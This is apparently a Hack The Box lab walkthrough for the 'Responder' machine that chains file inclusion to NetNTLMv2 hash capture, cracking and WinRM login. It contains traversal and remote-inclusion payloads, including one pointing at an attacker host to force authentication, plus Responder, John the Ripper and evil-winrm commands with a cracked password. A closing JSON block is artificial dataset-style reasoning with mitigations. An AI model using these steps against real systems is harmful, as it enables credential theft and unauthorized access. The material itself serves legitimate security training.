# HTB Responder - LFI to NetNTLM Capture to WinRM Playbook

Target theme:
- Hostname-based virtual host setup
- File inclusion abuse path
- NetNTLMv2 hash capture and cracking
- WinRM access with recovered credentials

Use in authorized HTB/lab scope only.

---

## 1. Objective

1. resolve redirected host correctly,
2. enumerate web parameter behavior,
3. trigger outbound auth event and capture NetNTLMv2,
4. crack captured hash,
5. authenticate through WinRM.

---

## 2. Initial Setup and Enumeration

If redirected domain does not resolve, add host mapping:

```bash
sudo sh -c 'echo "<TARGET_IP> unika.htb" >> /etc/hosts'
```

Full scan:

```bash
nmap -sC -sV -Pn -p- <TARGET_IP> -oN nmap.txt
```

Key answers from challenge context:
- redirected domain: `unika.htb`
- scripting language observed: `PHP`
- WinRM port: `5985/tcp`

---

## 3. Parameter Recon and Injection Path

Web app parameter used for language/page loading:
- `page`

Concept checks:
- LFI-style payload example: `../../../../../../../../windows/system32/drivers/etc/hosts`
- RFI-style payload example: `//10.10.14.6/somefile`

---

## 4. Responder Hash Capture

NTLM stands for:
- New Technology LAN Manager

Start Responder on your VPN interface:

```bash
sudo responder -I tun0
```

Flag to set interface:
- `-I`

Trigger request from vulnerable parameter to attacker-controlled path (lab scenario), then capture NetNTLMv2 hash in Responder output.

---

## 5. Crack Captured Hash

Tool full name:
- John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Recovered password in this machine flow:
- `badminton`

---

## 6. WinRM Access

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p badminton
```

Then enumerate users/directories and retrieve objective artifact.

---

## 7. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV -Pn -p- 10.129.147.99
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd ... (PHP)
5985/tcp open  http    Microsoft HTTPAPI (WinRM)

Browser -> http://10.129.147.99 redirects to http://unika.htb/

analyst@kali:~$ echo "10.129.147.99 unika.htb" | sudo tee -a /etc/hosts

analyst@kali:~$ sudo responder -I tun0
[+] Listening for events...
[+] NTLMv2-SSP Hash captured for user Administrator

analyst@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
administrator:badminton

analyst@kali:~$ evil-winrm -i 10.129.147.99 -u Administrator -p badminton
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

---

## 8. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "responder_ntlm_capture_to_winrm",
	"input_signals": [
		"Web app redirects to unika.htb requiring hosts-file mapping",
		"page parameter influences server-side resource loading",
		"Responder captured NetNTLMv2 challenge/response",
		"Cracked password authenticated over WinRM"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service and Host Discovery",
			"confidence": 0.94,
			"evidence": "nmap identified web service and WinRM port"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "File Inclusion Abuse / Forced Auth",
			"confidence": 0.86,
			"evidence": "page parameter used to trigger external auth attempt"
		},
		{
			"step": 3,
			"tactic": "credential_access",
			"technique": "NetNTLMv2 Hash Capture and Cracking",
			"confidence": 0.92,
			"evidence": "Responder captured hash and John recovered password"
		},
		{
			"step": 4,
			"tactic": "lateral_movement",
			"technique": "Remote Services (WinRM)",
			"confidence": 0.89,
			"evidence": "Recovered credentials valid on TCP/5985"
		}
	],
	"hypotheses": [
		"Credential reuse may exist for additional domain/local admin services",
		"File inclusion path may allow broader code execution under some configurations",
		"NTLM coercion risk may affect more hosts sharing similar web logic"
	],
	"uncertainties": [
		"Exact privilege boundaries of recovered account not fully enumerated",
		"Unknown if SMB signing/policies mitigate relay paths in wider network",
		"Scope of vulnerable page parameter across app routes not fully mapped"
	],
	"tool_calls": [
		{"name": "web_param_abuse_mapper", "priority": "high"},
		{"name": "ntlm_capture_validator", "priority": "high"},
		{"name": "winrm_access_scope_checker", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Patch file inclusion vulnerability and sanitize parameter handling",
			"Reset compromised credentials",
			"Restrict WinRM exposure to management subnets"
		],
		"hardening": [
			"Disable legacy NTLM where possible and enforce stronger auth",
			"Implement input allowlists for file/resource parameters",
			"Enforce SMB/HTTP auth hardening and segmentation"
		],
		"monitoring": [
			"Alert on outbound auth attempts to non-approved hosts",
			"Track repeated file inclusion traversal patterns",
			"Monitor suspicious WinRM logons with newly cracked credentials"
		]
	}
}
```
